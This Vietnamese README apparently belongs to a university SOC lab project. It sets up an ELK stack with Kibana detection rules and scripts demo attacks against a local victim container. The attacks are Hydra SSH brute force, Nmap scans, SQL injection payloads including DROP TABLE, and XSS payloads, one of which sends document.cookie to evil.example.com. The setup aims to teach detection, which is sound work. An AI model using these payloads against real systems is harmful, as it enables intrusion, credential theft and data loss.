# README — Role 3: SOC Analyst & Pentester
## Hướng dẫn chạy và demo đầy đủ — CO3069_252_CLM

---

## ⚠️ ĐỌC TRƯỚC KHI LÀM

**Tất cả lệnh đều chạy từ thư mục ROOT của dự án:**
```
~/CO3069_252_CLM/
```
Không vào sâu bên trong `srcs/`. File `.env` nằm trong `srcs/.env`.

**Cấu trúc quan trọng:**
```
CO3069_252_CLM/                  
├── srcs/
│   ├── .env                     
│   ├── SOC/
│   │   ├── generate_logs.py
│   │   ├── import_to_elastic.py
│   │   ├── setup_kibana.py
│   │   ├── auto_push.sh         ← Script tự động đẩy log
│   │   ├── dashboard.ndjson
│   │   ├── detection_rules/
│   │   │   └── all_rules.ndjson
│   │   ├── attack_scripts/
│   │   │   ├── attack_simulation.sh
│   │   │   └── setup_victim.sh
│   │   └── logs_sample/
│   │       ├── auth.log
│   │       ├── nginx_access.log
│   │       └── ufw.log
```

---

## BƯỚC 0 — Setup biến môi trường (chạy 1 lần mỗi terminal)

```bash
# Vào thư mục root
cd ~/CO3069_252_CLM

# Đọc password — .env nằm trong srcs/
export EPASS=$(grep '^ELASTIC_PASSWORD=' srcs/.env | cut -d= -f2 | tr -d '\r\n ')
export HMAC=$(grep '^LOG_HMAC_KEY=' srcs/.env | cut -d= -f2 | tr -d '\r\n ')

# Tạo alias tiện dùng
alias kcurl='curl -k -u elastic:$EPASS'

# Kiểm tra đã đọc được chưa
echo "EPASS = $EPASS"
echo "HMAC  = $HMAC"
```

> **Nếu EPASS trống:** chạy `cat srcs/.env` để xem nội dung file và kiểm tra tên biến

---

## BƯỚC 1 — Kiểm tra ELK Stack

```bash
# Kiểm tra tất cả container
docker compose ps
```

Kết quả mong đợi — tất cả phải `Up`:
```
NAME              STATUS
elasticsearch     Up (healthy)
kibana            Up
logstash          Up
filebeat          Up
```

```bash
# Test Elasticsearch
kcurl https://localhost:9200/_cluster/health?pretty
# Phải thấy: "status" : "yellow" hoặc "green"

# Test Kibana
curl -k https://localhost:5601/api/status 2>/dev/null | python3 -m json.tool | grep '"level"'
# Phải thấy: "level": "available"
```

> **Nếu container không Up:**
> ```bash
> sudo sysctl -w vm.max_map_count=262144
> docker compose down && docker compose up -d
> # Chờ 90 giây rồi kiểm tra lại
> ```

---

## BƯỚC 2 — Sinh log giả lập

```bash
cd ~/CO3069_252_CLM
python3 srcs/SOC/generate_logs.py --lines 2000 --output-dir srcs/SOC/logs_sample --inject
```

Output:
```
[*] Sinh log từ 2026-05-01 08:00 đến hiện tại ...
[+] auth.log          → srcs/SOC/logs_sample/auth.log  (1456 dòng)
[+] nginx_access.log  → srcs/SOC/logs_sample/nginx_access.log  (923 dòng)
[+] ufw.log           → srcs/SOC/logs_sample/ufw.log  (400 dòng)

[*] Xác nhận attack patterns:
    SSH brute-force events : 430
    SQLi events            : 87
    XSS events             : 10
    Sudo/su events         : 120
    UFW BLOCK events       : 400
```

---

## BƯỚC 3 — Import log vào Elasticsearch

```bash
python3 srcs/SOC/import_to_elastic.py --password $EPASS
```

Output:
```
[*] Skip SSL verify (cert tự ký của Người 1)
[+] Kết nối thành công: https://localhost:9200 (ES 8.12.0)
[*] auth.log: 1456 docs (128 security alerts)
    → logs-2026.05.01: 1456 OK, 0 errors
    → security-alerts-2026.05.01: 128 OK, 0 errors
[*] nginx_access.log: 923 docs (67 security alerts)
    → logs-2026.05.01: 923 OK, 0 errors
    → security-alerts-2026.05.01: 67 OK, 0 errors
[*] ufw.log: 400 docs (400 security alerts)
    → logs-2026.05.01: 400 OK, 0 errors
    → security-alerts-2026.05.01: 400 OK, 0 errors
```

Kiểm tra data đã vào:
```bash
kcurl 'https://localhost:9200/_cat/indices?v&h=index,docs.count'
```
Phải thấy:
```
index                        docs.count
logs-2026.05.01              2779
security-alerts-2026.05.01   595
```

---

## BƯỚC 4 — Tạo Dashboard và Import Rules

```bash
python3 srcs/SOC/setup_kibana.py --password $EPASS
```

Output:
```
[*] Chờ Kibana sẵn sàng OK (available)
[*] Tạo Data Views...
  [+] All Logs (logs-*)
  [+] Security Alerts (security-alerts-*)
  [+] Filebeat Raw (filebeat-*)
[*] Import Dashboard từ srcs/SOC/dashboard.ndjson...
  [+] Dashboard import thành công!
[*] Import 4 Detection Rules...
  [+] [Role3] SSH Brute-force Detection
  [+] [Role3] Port Scan / Path Enumeration Detection
  [+] [Role3] Web Attack — SQL Injection & XSS
  [+] [Role3] Privilege Escalation — Sudo/Su Detection
[+] Hoàn tất!
```

---

## ❗ BƯỚC 4b — FIX: Không thấy Security Alerts trên Kibana

**Đây là vấn đề thường gặp nhất.** Kibana Security cần được khởi tạo trước khi dùng. Làm theo thứ tự sau:

### Bước 4b.1 — Khởi tạo Security Engine

```bash
# Chạy lệnh này TRƯỚC KHI mở Security trên Kibana
curl -k -X POST \
  -u elastic:$EPASS \
  -H 'kbn-xsrf: true' \
  'https://localhost:5601/api/detection_engine/index'
```

Kết quả bắt buộc: `{"acknowledged":true}` — nếu thấy cái này là OK.

### Bước 4b.2 — Mở Kibana và điều hướng đúng

1. Mở Chrome/Edge: **https://localhost:5601**
2. Bấm **Advanced → Accept the Risk → Continue** (bỏ qua cảnh báo cert)
3. Đăng nhập: `elastic` / `[giá trị EPASS trong srcs/.env]`

### Bước 4b.3 — Tìm Security Alerts

Trên Kibana 8.x, menu "Security Alerts" **không** nằm trực tiếp trên thanh bên. Điều hướng như sau:

```
Menu trái (☰) → Security → Alerts
```

Nếu không thấy menu Security:
- Tìm biểu tượng **shield (🛡)** trên thanh sidebar dọc bên trái
- Hoặc truy cập thẳng URL: **https://localhost:5601/app/security/alerts**

### Bước 4b.4 — Nếu vẫn thấy trống

**Nguyên nhân 1: Time range sai** (hay gặp nhất)
- Góc trên phải Kibana → click vào ô thời gian (thường hiện "Last 15 minutes")
- Đổi thành **Last 24 hours** hoặc **Last 7 days**
- Bấm **Apply**

**Nguyên nhân 2: Rules chưa Enable**
```
Menu → Security → Rules → Detection rules (SIEM)
→ Thấy 4 rules → Click từng rule → Toggle "Enabled" (màu xanh)
```

**Nguyên nhân 3: Rules chưa chạy lần nào**
- Sau khi Enable, chờ **1-2 phút**
- Rules chạy theo interval: SSH Brute-force = 30s, Web Attack = 1 phút

**Nguyên nhân 4: Index không khớp**
```bash
# Kiểm tra xem security-alerts index có tồn tại không
kcurl 'https://localhost:9200/security-alerts-*/_count?pretty'
```
Nếu count = 0 → chạy lại Bước 3

**Nguyên nhân 5: Kibana Security chưa nhận diện index**

Vào **Stack Management → Data Views** → kiểm tra xem có `security-alerts-*` chưa. Nếu chưa:
```bash
# Tạo lại data views
python3 srcs/SOC/setup_kibana.py --password $EPASS --skip-rules --skip-dashboard
```

### Bước 4b.5 — Kiểm tra nhanh alerts qua API

```bash
# Đếm alerts do Kibana Detection Engine tạo
kcurl 'https://localhost:9200/.alerts-security.alerts-default/_count?pretty'

# Nếu count = 0, alerts chưa được tạo bởi rules
# Xem thử security-alerts index do mình import thủ công
kcurl 'https://localhost:9200/security-alerts-*/_count?pretty'
```

> **Phân biệt 2 loại "alerts":**
> - `security-alerts-*` — do `import_to_elastic.py` tạo ra, hiện trong **Discover**
> - `.alerts-security.alerts-default` — do Kibana Detection Rules tạo ra, hiện trong **Security → Alerts**
>
> Để **Security → Alerts** có dữ liệu, cần rules đã Enable và đã chạy ít nhất 1 lần.

---

## BƯỚC 5 — Phase 5: Demo tấn công

### 5.1 — Chuẩn bị 2 màn hình

**Màn hình 1 (Terminal WSL):** Chạy lệnh tấn công

**Màn hình 2 (Trình duyệt):** Mở sẵn các tab sau:
| Tab | URL | Mục đích |
|-----|-----|---------|
| 1 | https://localhost:5601/app/dashboards | Xem Dashboard |
| 2 | https://localhost:5601/app/security/alerts | Xem Alerts real-time |
| 3 | https://localhost:5601/app/discover | Khám phá log chi tiết |
| 4 | https://localhost:5601/app/security/rules | Kiểm tra Rules |

**Đặt auto-refresh:** Mỗi tab Kibana → góc trên phải → click biểu tượng đồng hồ → **Every 5 seconds**

**Đổi time range:** Last 15 minutes → **Last 24 hours**

### 5.2 — Tạo máy nạn nhân

```bash
bash srcs/SOC/attack_scripts/setup_victim.sh
```

Chờ ~20 giây. Kết quả:
```
════════════════════════════════════
  Victim Container Ready
════════════════════════════════════
  SSH : localhost:2222 (root/rootpass, testuser/password123)
  Web : http://localhost:8080
```

Kiểm tra:
```bash
curl -s http://localhost:8080 | grep "Test Web"
# Phải thấy: <h1>Test Web App</h1>
```

Cài công cụ tấn công:
```bash
sudo apt install -y hydra nmap sshpass
```

### 5.3 — Cách 1: Dùng auto_push.sh (pipeline tự động — ĐỀ XUẤT)

Script `auto_push.sh` theo dõi `/var/log/nginx/access.log` và `/var/log/auth.log`, tự động đẩy lên Kibana khi có log mới. Đây là cách demo đẹp nhất vì real-time.

**Mở Terminal 1 — chạy auto_push.sh:**
```bash
# Vào đúng thư mục chứa auto_push.sh
cd ~/CO3069_252_CLM/srcs/SOC

# Chạy script (nó tự đọc ../.env = srcs/.env)
bash auto_push.sh
```

Output khi chạy:
```
🚀 Hệ thống Canh gác và Tự động đẩy Log đang chạy...
Nhấn Ctrl+C để dừng.
```

Script sẽ tiếp tục chạy vòng lặp, kiểm tra mỗi 2 giây.

**Mở Terminal 2 — chạy tấn công:**

```bash
# SSH Brute-force
cat > /tmp/pass.txt << 'EOF'
123456
password
admin
root
testpass
password123
letmein
EOF

hydra -l root -P /tmp/pass.txt -t 6 -V -f -s 2222 localhost ssh
```

Khi Hydra chạy, Terminal 1 sẽ hiện:
```
🚨 Phát hiện tấn công SSH! Đang đẩy lên Kibana...
[+] Kết nối thành công...
[*] auth.log: 13 docs (13 security alerts)
✅ Đã đẩy và dọn dẹp SSH log.
```

**Quan sát Kibana Tab 2 (Alerts)** → alerts nhảy lên real-time.

### 5.4 — Cách 2: Dùng generate_test_logs.sh của Người 2 (pipeline chuẩn)

```bash
# Thêm log trực tiếp vào /var/log — Filebeat đọc → Logstash → ES → Kibana
sudo bash generate_test_logs.sh
```

Script tạo:
- SSH Failed password → `/var/log/auth.log`
- SQLi attack → `/var/log/nginx/access.log`
- XSS attack → `/var/log/nginx/access.log`
- UFW BLOCK → `/var/log/ufw.log`

### 5.5 — ATTACK 1: SSH Brute-force (Hydra)

**Terminal tấn công:**
```bash
hydra -l root -P /tmp/pass.txt -t 6 -V -f -s 2222 localhost ssh
```

**Kibana — Tab 2 (Alerts):** Chờ 30-60s → thấy alert `[Role3] SSH Brute-force Detection`

**Kibana — Tab 3 (Discover):** Chọn data view `All Logs` → search:
```
tags: "ssh_failed_login"
```

### 5.6 — ATTACK 2: Port Scan (Nmap)

```bash
# SYN scan
sudo nmap -sS -p 1-1000 --min-rate 2000 -T4 localhost

# Script scan vào web (tạo UA "Nmap Scripting Engine")
sudo nmap -sV --script=http-headers,http-title localhost -p 8080

# Aggressive scan
sudo nmap -A -p 2222,8080 localhost
```

**Kibana — Tab 2 (Alerts):** Thấy alert `[Role3] Port Scan`

**Kibana — Tab 3 (Discover):** search `tags: "potential_port_scan"`

### 5.7 — ATTACK 3: SQL Injection (curl)

```bash
PAYLOADS=(
  "' OR '1'='1"
  "' UNION SELECT null,username,password FROM users--"
  "'; DROP TABLE users;--"
  "1' AND SLEEP(5)--"
)

for p in "${PAYLOADS[@]}"; do
  enc=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$p'))")
  echo "SQLi: $p"
  curl -sS --max-time 3 \
    "http://localhost:8080/products.php?id=${enc}" \
    -o /dev/null -w "  HTTP %{http_code}\n" || true
  sleep 0.5
done
```

**Kibana — Tab 2 (Alerts):** Alert `[Role3] Web Attack — SQL Injection & XSS` với severity Critical

**Kibana — Tab 3 (Discover):** search `tags: "sql_injection"`

### 5.8 — ATTACK 4: XSS (curl)

```bash
XSS=(
  "<script>alert(document.cookie)</script>"
  "<img src=x onerror=alert(1)>"
  "<svg onload=fetch('https://evil.example.com/'+document.cookie)>"
)

for p in "${XSS[@]}"; do
  enc=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$p'))")
  curl -sS --max-time 3 \
    "http://localhost:8080/search?q=${enc}" \
    -o /dev/null -w "XSS HTTP %{http_code}\n" || true
done
```

**Kibana — Tab 1 (Dashboard):** Panel "web attack type" cập nhật thêm XSS

### 5.9 — ATTACK 5: RBAC Test (403 Forbidden)

```bash
# Tạo viewer user
curl -k -X POST \
  -u elastic:$EPASS \
  -H 'Content-Type: application/json' \
  'https://localhost:9200/_security/user/viewer_user' \
  -d '{"password":"viewerpass123","roles":["kibana_viewer"],"full_name":"Viewer Test"}'
# Kết quả: {"created":true}

# Thử DELETE bằng Viewer → phải bị 403
TODAY=$(date +%Y.%m.%d)
curl -k -v -X DELETE \
  -u viewer_user:viewerpass123 \
  "https://localhost:9200/logs-${TODAY}/_doc/1" 2>&1 | grep '< HTTP'
# Kết quả: < HTTP/1.1 403 Forbidden
```

### 5.10 — ATTACK 6: HMAC Tamper Test (kết hợp Người 2)

```bash
TODAY=$(date +%Y.%m.%d)

# Bước 1: Lấy document ID
ID=$(kcurl "https://localhost:9200/logs-${TODAY}/_search?size=1" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['hits']['hits'][0]['_id'])")
echo "Doc ID: $ID"

# Bước 2: Verify — phải SUCCESS
python3 verify_log_integrity.py "logs-${TODAY}" "$ID" "$HMAC" "$EPASS"
# → SUCCESS: Integrity Verified! ✅

# Bước 3: Tamper document
kcurl -X POST -H 'Content-Type: application/json' \
  "https://localhost:9200/logs-${TODAY}/_update/$ID" \
  -d '{"doc":{"message":"** TAMPERED BY ATTACKER **"}}'

# Bước 4: Verify lại — phải FAILURE
python3 verify_log_integrity.py "logs-${TODAY}" "$ID" "$HMAC" "$EPASS"
# → FAILURE: Integrity Check Failed! ❌
```

---

## BƯỚC 6 — Xem kết quả trên Kibana (hướng dẫn từng tab)

### Tab 1 — Dashboard: https://localhost:5601/app/dashboards

```
Dashboards → tìm "[Role3] Security Monitoring Dashboard" → Click
```

Dashboard có 4 panels:
- **SSH Login Failures Over Time** — bar chart, dữ liệu từ `logs-*`, filter `tags: ssh_failed_login`
- **Top Attacker IPs** — bảng top 5 IP tấn công từ `security-alerts-*`
- **web attack type** — pie/donut chart SQLi vs XSS
- **Total Security Alerts** — số metric tổng

Nếu panel trống → click **Edit** → chọn đúng data view cho từng panel.

### Tab 2 — Security Alerts: https://localhost:5601/app/security/alerts

```
Menu ☰ → Security → Alerts
```

Hiện danh sách alerts theo severity: Critical (đỏ) → High (cam) → Medium (vàng).

Để xem chi tiết: click vào 1 alert → xem `source.ip`, `tags`, `alert_level`, `message`.

**Nếu trống** → xem lại [Bước 4b](#bước-4b--fix-không-thấy-security-alerts-trên-kibana)

### Tab 3 — Discover: https://localhost:5601/app/discover

```
Menu ☰ → Discover
```

Chọn data view và filter để xem từng loại event:

| Xem gì | Data View | Filter |
|--------|-----------|--------|
| SSH fails | All Logs | `tags: "ssh_failed_login"` |
| SQLi | All Logs | `tags: "sql_injection"` |
| XSS | All Logs | `tags: "xss"` |
| Port scan | All Logs | `tags: "potential_port_scan"` |
| Tất cả alerts | Security Alerts | *(không cần filter)* |
| Privilege escalation | All Logs | `tags: "privilege_escalation"` |

### Tab 4 — Rules: https://localhost:5601/app/security/rules

```
Menu ☰ → Security → Rules → Detection rules (SIEM)
```

Phải thấy 4 rules đều **Enabled** (màu xanh):
- `[Role3] SSH Brute-force Detection` — High
- `[Role3] Port Scan / Path Enumeration Detection` — Medium
- `[Role3] Web Attack — SQL Injection & XSS` — Critical
- `[Role3] Privilege Escalation — Sudo/Su Detection` — Critical

---

## BƯỚC 7 — Kiểm tra nhanh qua Terminal

```bash
# Tổng quan tất cả index
kcurl 'https://localhost:9200/_cat/indices?v&h=index,docs.count,store.size'

# Đếm security alerts
kcurl 'https://localhost:9200/security-alerts-*/_count?pretty'

# Đếm SSH brute-force events
kcurl 'https://localhost:9200/logs-*/_search?pretty' \
  -H 'Content-Type: application/json' \
  -d '{"query":{"term":{"tags":"ssh_failed_login"}},"track_total_hits":true}' \
  | python3 -m json.tool | grep '"value"'

# Đếm web attacks
kcurl 'https://localhost:9200/security-alerts-*/_search?pretty' \
  -H 'Content-Type: application/json' \
  -d '{"query":{"terms":{"tags":["sql_injection","xss"]}},"track_total_hits":true}' \
  | python3 -m json.tool | grep '"value"'

# Xem Kibana Detection Engine alerts (do Rules tạo)
kcurl 'https://localhost:9200/.alerts-security.alerts-default/_count?pretty'
```

---

## auto_push.sh — Giải thích và cách dùng

### auto_push.sh làm gì?

Script chạy vòng lặp vô hạn, **kiểm tra mỗi 2 giây**:
- Nếu `/var/log/nginx/access.log` có nội dung → đẩy lên ES → xóa file
- Nếu `/var/log/auth.log` có nội dung → đẩy lên ES → xóa file

### Cách chạy đúng

```bash
# Vào ĐÚNG thư mục (script đọc ../.env = srcs/.env)
cd ~/CO3069_252_CLM/srcs/SOC

# Chạy — cần quyền sudo để xóa /var/log
bash auto_push.sh
```

### Tại sao phải vào srcs/SOC?

Trong script có dòng:
```bash
EPASS=$(grep ELASTIC_PASSWORD ../.env | cut -d= -f2 | tr -d '\r')
```
`../.env` = thư mục cha của nơi chạy script = `srcs/.env`. Nếu chạy từ sai thư mục sẽ báo lỗi `ELASTIC_PASSWORD not found`.

### Workflow demo với auto_push.sh

```
Terminal 1                          Terminal 2 (tấn công)
─────────────────────────────────   ────────────────────────────────
cd ~/CO3069_252_CLM/srcs/SOC        # Chạy attack
bash auto_push.sh                   hydra -l root -P /tmp/pass.txt \
                                      -t 6 -s 2222 localhost ssh
                                    ↓
🚨 Phát hiện tấn công SSH!          sudo bash generate_test_logs.sh
[+] Kết nối thành công...
    → logs-...: 13 OK               curl http://localhost:8080/products.php
✅ Đã đẩy và dọn dẹp               ?id=1'%20UNION%20SELECT...

🚨 Phát hiện tấn công Web!
[+] Kết nối thành công...
    → security-alerts-...: 3 OK
✅ Đã đẩy và dọn dẹp
```

Trong khi đó Kibana Alerts (Tab 2) tự refresh 5s và hiện alerts mới.

### Lưu ý với auto_push.sh

Script đọc `--auth-log /var/log/auth.log` và `--nginx-log /var/log/nginx/access.log` trực tiếp từ hệ thống. Để có log thật:

```bash
# Tạo log SSH thật bằng cách ssh thử nhiều lần sai
ssh -p 2222 root@localhost   # gõ sai pass nhiều lần

# Hoặc dùng generate_test_logs.sh để tạo log giả vào /var/log
sudo bash ~/CO3069_252_CLM/generate_test_logs.sh
```

---

## Lệnh reset nhanh (nếu cần bắt đầu lại)

```bash
# Xóa toàn bộ data ES và bắt đầu lại
cd ~/CO3069_252_CLM
docker compose down -v       # -v xóa luôn es_data volume
docker compose up -d
# Chờ 90 giây rồi làm lại từ Bước 1

# Chỉ xóa index hôm nay
TODAY=$(date +%Y.%m.%d)
kcurl -X DELETE "https://localhost:9200/logs-${TODAY}"
kcurl -X DELETE "https://localhost:9200/security-alerts-${TODAY}"

# Dừng victim container
docker rm -f victim
```

---

